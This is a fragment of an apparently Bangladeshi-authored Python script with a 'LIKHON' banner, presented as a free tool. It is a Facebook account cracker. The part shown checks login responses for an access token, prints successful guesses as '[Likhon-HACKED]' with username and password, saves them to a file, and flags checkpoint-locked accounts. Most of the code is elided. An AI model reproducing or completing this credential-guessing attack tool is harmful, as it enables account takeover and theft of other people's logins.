...
\033[0;96m   | |      | | | ' /| |__| | |  | |  \| |
\033[0;96m    | |      | | |  < |  __  | |  | | . ` |
\033[0;96m    | |____ _| |_| . \| |  | | |__| | |\  |
\033[0;96m    |______|_____|_|\_\_|  |_|\____/|_| \_|
""")

print("\033[0;91mThis Tool's Free By Likhon Islam")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Likhon-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Likhon-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
